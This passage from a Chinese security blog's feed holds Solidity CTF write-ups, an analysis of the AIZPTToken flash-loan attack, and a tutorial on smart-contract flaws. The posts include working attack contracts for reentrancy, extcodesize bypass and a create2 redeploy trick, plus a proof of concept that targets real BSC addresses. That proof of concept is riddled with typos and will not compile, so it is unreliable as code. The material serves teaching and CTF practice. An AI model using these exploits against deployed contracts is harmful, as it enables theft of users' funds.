            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-The lost Kitty</title>
      <link href="/2024/10/15/CTF-The-lost-Kitty/"/>
      <url>/2024/10/15/CTF-The-lost-Kitty/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-The-lost-kitty"><a href="#CTF-The-lost-kitty" class="headerlink" title="CTF-The lost kitty"></a>CTF-The lost kitty</h1><p>题目就是Lucas在一个空间为2^256的房间丢失了一只猫，要求我们找到这只小猫，题目的源代码，如下：<br>&#x2F;&#x2F; SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;</p><p>contract HiddenKittyCat {<br>    address private immutable _owner;</p><p>    constructor() {<br>        _owner &#x3D; msg.sender;<br>        bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</p><p>        assembly {<br>            sstore(slot, “KittyCat!”)<br>        }<br>    }</p><p>    function areYouHidingHere(bytes32 slot) external view returns (bool) {<br>        require(msg.sender &#x3D;&#x3D; _owner, “!owner”);<br>        bytes32 kittyPointer;</p><p>        assembly {<br>            kittyPointer :&#x3D; sload(slot)<br>        }</p><p>        return kittyPointer &#x3D;&#x3D; “KittyCat!”;<br>    }</p><p>    function destroyMe() external {<br>        require(msg.sender &#x3D;&#x3D; _owner, “!owner”);<br>        selfdestruct(payable(address(0)));<br>    }<br>}</p><p>contract House {<br>    bool public catFound;</p><p>    function isKittyCatHere(bytes32 _slot) external {<br>        if (catFound) {<br>            return;<br>        }<br>        HiddenKittyCat hiddenKittyCat &#x3D; new HiddenKittyCat();<br>        bool found &#x3D; hiddenKittyCat.areYouHidingHere(_slot);</p><p>        if (!found) {<br>            hiddenKittyCat.destroyMe();<br>        } else {<br>            catFound &#x3D; true;<br>        }<br>    }<br>}</p><p> 阅读完整个代码，好像似曾相识，原来在以前的ethernaut里见过，这个题类似于Ethernaut里的Flipflopcoin，都是答案已经出来了</p><p> 首先hidekittycat合约中的函数都有require（msg.sender&#x3D;&#x3D;owner）的验证，如果想直接调用areYoufindhere函数，这样会很难调用， 这kittycat题又是涉及到汇编的知识，不过这个汇编很好理解，slot为储存位置，使用sstore汇编语言，将kittycat储存到slot位置上，然而这个slot的具体值，已经在构造函数中计算出来了。再来看看house合约，在isKittyCathouse函数中，只要我们传入正确的_slot，就能使catFound变为ture,而正确的_slot在前面已经有了，所以我们只需要写一个攻击合约，如下：</p><p>&#x2F;&#x2F;SPDX-License-Identifier:MIT</p><p>pragma solidity ^0.8.0;</p><p>interface Ihouse{<br>     function isKittyCatHere(bytes32 _slot) external;<br>}<br>contract Attracker{<br>     Ihouse public target;</p><p>     constructor(address _target){<br>        target &#x3D; Ihouse(_target);<br>     }</p><p>     function pwn () external {<br>      bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));<br>      target.isKittyCatHere(slot);<br>     }<br>}</p><p>先部署house合约，得到它的地址：0xE726d7E7739188f0fA45267997eA97b8b1D891E6</p><p>在部署Attracter合约，传入house合约的地址，调用pwn函数，即可</p><p>最后查看cat是否找到，CatFound就变为ture,说明已经找到cat.</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Creativity</title>
      <link href="/2024/10/14/CTF-Creativity/"/>
      <url>/2024/10/14/CTF-Creativity/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Creativity"><a href="#CTF-Creativity" class="headerlink" title="CTF-Creativity"></a>CTF-Creativity</h1><p>题目：要求调用sendFlag(),记录事件<br>源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Creativity &#123;</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line">    </span><br><span class="line">    address public target;</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line">    </span><br><span class="line">    function check(address _addr) public &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; size := extcodesize(_addr) &#125;</span><br><span class="line">        require(size &gt; 0 &amp;&amp; size &lt;= 4);</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function execute() public &#123;</span><br><span class="line">        require(target != address(0));</span><br><span class="line">        target.delegatecall(abi.encodeWithSignature(&quot;&quot;));</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这题涉及到汇编，委托调用，还有一个不明显的create2的用法<br>  首先看到check函数，要求参数地址的合约代码大小不能超过4字节，这是很难办到的，在ethernaunt上遇到过这种类似的题，只不过那上面的题考察点没有这个题多。<br>  继续看到execute函数，首先进行了零地址的检查，在进行委托调用，最后是自毁函数<br>  如果我们要直接调用sendFlag函数，必须发送value大于100000000ehter，这是肯定是不可采取的措施，怎样才能绕过这个require,我们就要回到execute函数中，突破口是：target.detegatecall(),通过委托调用target合约，执行结果在Createtivity合约中，这样就清晰了<br>  我们可以通过create2的一个骚操作，在同一个地址上部署合约，合约的字节码可以不同，简单来说，就是在同一个地址上先后部署不同的合约，这样就可以实现，第一个部署的合约，满足自毁函数，第二个部署的合约，实现合约中的emit SendFlag事件<br>  接下来就是考虑如何用代码实现create的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line">    </span><br><span class="line">    function deploy(bytes memory code) public &#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        // Compile Dumper to get this bytecode</span><br><span class="line">        bytes memory dumperBytecode = hex&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        Deployer dp = Deployer(msg.sender);</span><br><span class="line">        bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return (add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上有俩个代码，先部署Dumper合约，获得它的字节码，Deployer合约实现create2的功能<br>首先先将Deployer 部署，获得地址：0x307FdF03B1842A501F52221e4cF02D67BfeEc399<br>然后使用Deployer.deploy部署0x33ff，得到部署的合约地址0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663</p><p>调用check()，target就是我们部署的合约</p><p>然后在进行自毁，给我们已经部署的合约发一笔空交易，让它进行自毁，再次使用create2的操作，还是使用Deployer.deploy在这个地址部署另一个合约，合约的内容要包括emit SendFlag(0),<br>这里有个简单的hack合约<br>contract hack {<br>    event SendFlag(address addr);<br>    constructor() public {<br>        emit SendFlag(address(0));<br>    }<br>}<br>最后再调用execute函数，就会执行我们第二次部署的合约里的emit SendFlag;</p><p>完成以上步骤，就可以看到我们已经成功执行了emit SendFlag</p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>creat2的用法：在solidity 8.0版本之后，都是使用new关键字来创建合约，但是它还有一种就是使用内联汇编(assembly)</p><p>主要说一下，new的方法创建合约.直接上合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 被创建合约</span><br><span class="line">contract Callee &#123;</span><br><span class="line">  string value1;</span><br><span class="line">  string value2;</span><br><span class="line"></span><br><span class="line">  // 构造函数有两个参数</span><br><span class="line">  constructor(string memory _value1,string memory _value2) &#123;</span><br><span class="line">    value1 = _value1;</span><br><span class="line">    value2 = _value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 合约创建者</span><br><span class="line">contract ContractCreator &#123;</span><br><span class="line">  // 新合约地址</span><br><span class="line">  address public contractAddress;</span><br><span class="line"></span><br><span class="line">  // 创建合约</span><br><span class="line">  function newContract(string memory value1,string memory value2) external &#123;</span><br><span class="line">    // 生成盐值</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(value1,value2));</span><br><span class="line">    // 创建 Callee 合约实例，参数为 _salt, value1, value2</span><br><span class="line">    Callee callee = new Callee&#123;salt:salt&#125;(value1, value2);</span><br><span class="line">    // 设置新建合约的地址</span><br><span class="line">    contractAddress = address(callee);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>委托调用:看这俩篇<a href="https://learnblockchain.cn/article/5372">文章1</a>，<a href="https://blog.csdn.net/ak19920601/article/details/135908265">文章2</a>,讲的很好。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20241005AIZPTToken攻击事件分析</title>
      <link href="/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="AIZPTToken攻击事件分析"><a href="#AIZPTToken攻击事件分析" class="headerlink" title="AIZPTToken攻击事件分析"></a>AIZPTToken攻击事件分析</h2><p>先大概描述一下：攻击者使用闪电贷借的钱，然后再购买了价值8000 BNB的AIPTToken,然后再以高价卖出，从中得到利润，还清借款，最终获得价值34BNB（约俩万美金）。</p><p>这是发生在最近的攻击，首先攻击者发现了这个AIZPTToken代币买卖的计算错误，下面是截取的AIZPTToken合约中的一段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>从上面，可以发现，用少量的BNB购买AIZPTToken,就可以以高价出售，具体可以对比俩段代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>第一个是买AIPTToken,如果以20的价钱购买12个代币，然后我们出售代币的时候，以同样20的价格出售，那么购买人获得代币的数量是少于12的，换种方法来说，就是可以以高价出售相同代币的数量</p><p>下面是攻击者的攻击的测试合约</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //将攻击合约中剩下的钱转给攻击者自己的地址        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //出售200次        for (uint256 i; i &lt; 199; ++i) &#123;          //以383727 ether的价格卖出代币            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // 还清贷款和利息        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;从测试合约中来看,就是在执行闪电贷回调的时候,进行一个购买出售的操作完整的调用信息[点击](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>智能合约的漏洞</title>
      <link href="/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="智能合约的漏洞"><a href="#智能合约的漏洞" class="headerlink" title="智能合约的漏洞"></a>智能合约的漏洞</h1><h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p> 重入漏洞本质上是状态同步问题，当智能合约调用外部函数时，执行流会转移到被调用的合约，如果调用合约未能正确同步状态，则在流程转移过程中可能会被重新进入，导致重复执行相同的代码逻辑。具体来说，攻击通常分两个步骤展开：<br>1，被攻击合约调用攻击合约的外部函数，并转移执行流程。<br>2，在攻击合约函数内部，利用一定的技巧，再次调用被攻击合约的漏洞函数。<br>由于以太坊虚拟机 (EVM) 是单线程的，因此在重新进入易受攻击的函数时，合约状态不会正确更新，类似于初始调用。这允许攻击者重复执行某些代码逻辑，从而实现意外行为。典型的攻击模式涉及多次重复的资金提取。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>以修改后的WETH为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 bal = balances[msg.sender];</span><br><span class="line">        require(bal &gt; 0);</span><br><span class="line"></span><br><span class="line">        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<strong>存款函数</strong>中，用户可以存入ETH，收到的WETH记录在<strong>余额</strong>状态变量中。</li><li>在<strong>withdraw函数</strong>中，用户可以通过调用 call 函数来提取 ETH，<strong>call</strong>函数用于向用户转账。此时，执行流程转移到用户的合约。如果用户合约是恶意的，它可以通过默认的<strong>accept函数重新进入withdraw函数</strong>。由于余额没有更新，<strong>require</strong>语句通过了检查，从而允许攻击合约重复提取 ETH。</li></ul><p>攻击者就可以部署一个名为Attack的恶意合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStore public etherStore;</span><br><span class="line">    uint256 public constant AMOUNT = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // receive is called when EtherStore sends Ether to this contract.</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= AMOUNT) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= AMOUNT);</span><br><span class="line">        etherStore.deposit&#123;value: AMOUNT&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<strong>攻击函数</strong>中，攻击者首先转入一定数量的ETH，调用<strong>etherStore.deposit</strong>函数将其转入目标合约<strong>EtherStore</strong> ，然后调用<strong>etherStore.withdraw</strong>函数提现ETH。这看似是一个常规操作，但问题就出现在下一个函数中。</li><li>合约收到 ETH 时默认执行的函数是<strong>accept</strong>，它标有<strong>payable</strong>关键字，表示它可以接收发送给它的 ETH（使用<strong>fallback</strong>函数可以实现类似的效果）。在函数内部，如果目标合约的余额满足条件（大于 1 ETH），则再次调用<strong>withdraw</strong>函数，触发重新进入。由于目标合约中用户余额只在最后一步更新，因此条件<strong>require(bal &gt; 0)</strong>;仍然成立，允许攻击者继续从目标合约中抽取 ETH 😨😨😨</li></ul><h2 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h2><h3 id="不受限制的初始化函数"><a href="#不受限制的初始化函数" class="headerlink" title="不受限制的初始化函数"></a>不受限制的初始化函数</h3><p>某些合约包含用于设置所有者的初始化函数，但未能限制该函数只能调用一次。攻击者可以利用这一点，再次调用初始化函数，将所有权转移到他们的账户中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initContract() public &#123;</span><br><span class="line">    owner = msg.sender; // Lack of calling restriction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过度授权的角色"><a href="#过度授权的角色" class="headerlink" title="过度授权的角色"></a>过度授权的角色</h3><p>使用 OpenZeppelin 的Ownable库时，如果多个角色被分配onlyOwner权限，则会增加攻击面。一旦攻击者获得具有所有者权限的帐户的访问权限，他们就可以执行合约中的任何关键功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyOwner &#123;</span><br><span class="line">    // Critical logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代币销毁函数授权不当"><a href="#代币销毁函数授权不当" class="headerlink" title="代币销毁函数授权不当"></a>代币销毁函数授权不当</h3><p>如果代币合约中的销毁函数是公开的，任何人都可以调用它来销毁别人的代币，从而操纵代币供应，导致价格波动和流动性枯竭。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;</span><br><span class="line">    _burn(account, amount); // No access control</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20批准骗局"><a href="#ERC20批准骗局" class="headerlink" title="ERC20批准骗局"></a>ERC20批准骗局</h2><p>在区块链世界中，以太坊的ERC20代币标准是最知名的代币协议标准之一。然而在ERC20标准实施过程中，对approve函数的滥用会导致一个严重的安全漏洞ApproveScam 。接下来将对ApproveScam漏洞的原理、后果以及相应的预防措施进行探讨。</p><h3 id="ApproveScan漏洞是什么"><a href="#ApproveScan漏洞是什么" class="headerlink" title="ApproveScan漏洞是什么"></a>ApproveScan漏洞是什么</h3><p>ApproveScam 漏洞源于对ERC20 标准中<strong>批准函数的滥用</strong>。<strong>批准</strong>函数旨在允许代币持有者授权特定地址从持有者的账户中转出一定数量的代币。但是，如果持有者批准的金额过大（通常是<strong>type(uint256).max</strong>表示的无限金额），攻击者可以在未经持有者同意的情况下从持有者的账户中转出所有代币。</p><p>具体来说，一旦 Alice 授权 Eve 从 Alice 的账户中转出无限量的代币，Eve 就可以调用transferFrom函数将 Alice 账户中的所有代币转移到自己的账户中。这就是 ApproveScam 漏洞的核心原理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Alice approves Eve to transfer an unlimited amount of tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.approve(address(eve), type(uint256).max);</span><br><span class="line"></span><br><span class="line">// Eve uses the authorization to transfer all tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.transferFrom(address(alice), address(eve), 1000);</span><br></pre></td></tr></table></figure><h3 id="ApproveScan的后果"><a href="#ApproveScan的后果" class="headerlink" title="ApproveScan的后果"></a>ApproveScan的后果</h3><p>ApproveScam 漏洞背后的原理虽然简单，但造成的损失却是灾难性的。一旦用户轻易授权某个地址，攻击者便可以在用户不知情的情况下，轻松将用户账户中的所有代币转走。</p><p>此外，ApproveScam 漏洞还可能被滥用于洗钱等其他非法活动。总而言之，ApproveScam 是一个严重的安全风险，开发人员和用户需要认真对待。</p><h3 id="如何预防ApproveScan"><a href="#如何预防ApproveScan" class="headerlink" title="如何预防ApproveScan"></a>如何预防ApproveScan</h3><p>预防 ApproveScam 漏洞的最佳方法是谨慎使用批准功能，尤其是在授权金额时。请遵循以下原则：</p><ul><li>仅在必要时调用批准功能，避免过度使用或滥用。</li><li>根据实际需要设置授权金额，例如permit(spender, amount)而不是permit(spender, type(uint256).max) 。</li><li>完成功能后立即撤销之前的授权，即approve(spender, 0) 。</li><li>在智能合约开发过程中，彻底检查批准功能的使用，以防止 ApproveScam 漏洞。</li></ul><h2 id="合约账户检查漏洞"><a href="#合约账户检查漏洞" class="headerlink" title="合约账户检查漏洞"></a>合约账户检查漏洞</h2><p>在 Solidity 智能合约开发中，开发者经常会使用各种检查机制来保证合约的安全。一种常见的做法是使用<strong>extcodesize函数</strong>来检查调用者地址的代码大小，从而区分合约账户和外部拥有账户（EOA）。然而，如果滥用该机制，攻击者可以利用合约构造函数中的临时漏洞绕过检查，发起恶意操作。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>智能合约在初次部署时，会先执行构造函数代码，在构造函数执行完成之前，新部署的合约地址上其实是没有任何字节码存在的，这就导致了基于 extcodesize 的检查存在一个盲点：如果攻击者在构造函数内立刻调用目标合约，由于攻击者合约地址上的字节码还未存储，因此<strong>extcodesize(address(this))会</strong>返回 0，从而绕过isContract 的检查。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        // At this point, extcodesize(address(this)) == 0</span><br><span class="line">        // Bypass the isContract check of the target contract</span><br><span class="line">        Target(_target).isContract(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码演示了一个典型的攻击场景，Attack合约在构造时传入Target合约地址，并立即在构造函数内调用Target.isContract()函数。由于Attack的部署尚未完成，isContract(address(this))将返回 false，从而允许攻击者绕过这一层保护并调用受保护的函数。</p><h3 id="漏洞利用演示"><a href="#漏洞利用演示" class="headerlink" title="漏洞利用演示"></a>漏洞利用演示</h3><p>Target合约有一个状态变量pwned,初始设置为false,该合约的设计初衷是只允许外部账户修改其值，而不允许合约账户修改，它通过isContract函数实现者一点，该函数依赖于extaodesize的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">        // This method relies on extcodesize, which returns 0 for contracts in</span><br><span class="line">        // construction, since the code is only stored at the end of the</span><br><span class="line">        // constructor execution.</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool public pwned = false;</span><br><span class="line"></span><br><span class="line">    function protected() external &#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;no contract allowed&quot;);</span><br><span class="line">        pwned = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们要修改pwned的值，使用以下代码是不能攻击成功的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FailedAttack &#123;</span><br><span class="line">    // Attempting to call Target.protected will fail,</span><br><span class="line">    // Target blocks calls from contracts</span><br><span class="line">    function pwn(address _target) external &#123;</span><br><span class="line">        // This will fail</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为Target合约只允许外部账户（EOA）调用，而我们的攻击合约是不能修改的</p><p>如果我们在构造函数中调用，其就会绕过isContract的检查，攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    bool public isContract;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    // When contract is being created, code size (extcodesize) is 0.</span><br><span class="line">    // This will bypass the isContract() check</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        isContract = Target(_target).isContract(address(this));</span><br><span class="line">        addr = address(this);</span><br><span class="line">        // This will work</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><p>为了修复此漏洞，我们可以不依赖extcodesize来执行检查，而是直接比较tx.origin和msg.sender是否相同。由于tx.origin始终指向最初发起交易的 EOA 地址，因此我们可以有效区分合约和 EOA 调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">    require(tx.origin == msg.sender);</span><br><span class="line">    return account.code.length &gt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="闪电贷攻击"><a href="#闪电贷攻击" class="headerlink" title="闪电贷攻击"></a>闪电贷攻击</h2><h3 id="闪电贷贷款人漏洞1"><a href="#闪电贷贷款人漏洞1" class="headerlink" title="闪电贷贷款人漏洞1"></a>闪电贷贷款人漏洞1</h3><p> MyToken是标准的 ERC20 代币，作为LenderPool内可供借贷的资产。</p><p> LenderPool合约允许用户执行闪电贷交易，其flashLoan函数接受用户请求，借出一定数量的代币，调用目标合约上的特定操作，并偿还贷款。在函数的最后，它会验证偿还后的余额是否大于偿还前的余额。通常，偿还金额包括本金和利息。因此，在发起贷款后，池子的余额应该增加。否则，贷款交易失败。</p><p> 